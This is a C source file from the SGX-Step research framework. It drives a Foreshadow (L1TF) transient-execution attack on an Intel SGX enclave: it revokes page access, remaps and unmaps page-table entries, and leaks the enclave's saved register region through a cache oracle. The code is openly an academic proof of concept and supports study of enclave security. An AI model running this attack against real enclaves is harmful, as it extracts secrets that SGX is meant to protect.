/*
 *  This file is part of the SGX-Step enclave execution control framework.
 *
 *  Copyright (C) 2017 Jo Van Bulck <jo.vanbulck@cs.kuleuven.be>,
 *                     Raoul Strackx <raoul.strackx@cs.kuleuven.be>
 *
 *  SGX-Step is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  SGX-Step is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with SGX-Step. If not, see <http://www.gnu.org/licenses/>.
 */

#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>

#include "libsgxstep/apic.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/foreshadow.h"
#include "libsgxstep/cache.h"

#define DEBUG_ENCLAVE	    1
#define RELEASE_ENCLAVE	    0

#define ENCLAVE_SO	"Enclave/encl.so"
#define ENCLAVE_MODE 	DEBUG_ENCLAVE

uint8_t *oracle = NULL;
void *trigger_ptr = NULL;

void *ssa_gprsgx = NULL;
void *alias_ssa_gprsgx = NULL;
uint64_t *pte_alias = NULL;

gprsgx_region_t shadow_gprsgx = {0x00};

int fault_fired = 0;
int cur_byte = 0;

/* ================== ATTACKER IRQ/FAULT HANDLERS ================= */

/* Called upon SIGSEGV caused by untrusted page tables. */
void fault_handler(int signal)
{
    fault_fired++;

    if ( !(cur_byte = foreshadow_ssa(&shadow_gprsgx, alias_ssa_gprsgx, oracle)) )
    {
        /* restore access on trigger page to allow enclave to finish execution */
        printf("\n");
        info("finishing enclave execution (restoring trigger access rights)");
        ASSERT(!mprotect(trigger_ptr, 0x1000, PROT_READ | PROT_WRITE));
    }
    else
    {
        if (fault_fired == 1)
            printf("[#PF handler] ERESUME prefetch to refresh GPRSGX region; byte: ");
        printf("%d ", cur_byte);
    }
}

/* ================== ATTACKER INIT/SETUP ================= */

/* Configure and check attacker untrusted runtime environment. */
void attacker_config_runtime(void)
{
    ASSERT( !claim_cpu(VICTIM_CPU) );
    ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );
    ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);

    register_enclave_info();
    print_enclave_info();

    oracle = create_oracle_buffer();
    info("oracle at %p", oracle);
}

void attacker_config_page_table(void)
{
    info("enclave trigger at %p (revoking trigger access rights)", oracle);
    ASSERT( !mprotect( trigger_ptr, 0x1000, PROT_NONE ));

    /* establish independent virtual alias mapping for enclave secret */
    ssa_gprsgx = get_enclave_ssa_gprsgx_adrs();
    alias_ssa_gprsgx = remap_page_table_level( ssa_gprsgx, PAGE );
    info("enclave SSA GPRSGX region at %p; alias at %p (revoking alias access rights)",
        ssa_gprsgx, alias_ssa_gprsgx);
    print_pte_adrs(ssa_gprsgx);

    /* ensure a #PF on trigger accesses through the *alias* mapping */
    ASSERT( pte_alias = remap_page_table_level( alias_ssa_gprsgx, PTE) );
    *pte_alias = MARK_NOT_PRESENT(*pte_alias);
    print_pte(pte_alias);
}

void attacker_restore_runtime(void)
{
    restore_system_state();
    destroy_oracle_buffer(oracle);
}

/* ================== ATTACKER MAIN ================= */

/* Untrusted main function to create/enter the trusted enclave. */
int main( int argc, char **argv )
{
    sgx_enclave_id_t eid = 0;
    sgx_launch_token_t token = {0};
    int updated = 0;
    
    info("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave( ENCLAVE_SO, ENCLAVE_MODE,
                                    &token, &updated, &eid, NULL ) );

    /* configure attack untrusted runtime */
    attacker_config_runtime();

    /* benchmark enclave trigger page and SSA frame addresses */
    SGX_ASSERT( enclave_get_trigger_adrs( eid, &trigger_ptr) );
    attacker_config_page_table();

    /* enter enclave; should fault on trigger page */
    sgx_step_eresume_cnt = 0;
    SGX_ASSERT( enclave_run( eid ) );

    ASSERT(fault_fired);
    dump_gprsgx_region(&shadow_gprsgx);
    foreshadow_dump_perf();
    info("total of %d faulting ERESUME calls needed", sgx_step_eresume_cnt); 

    attacker_restore_runtime();
    return 0;
}
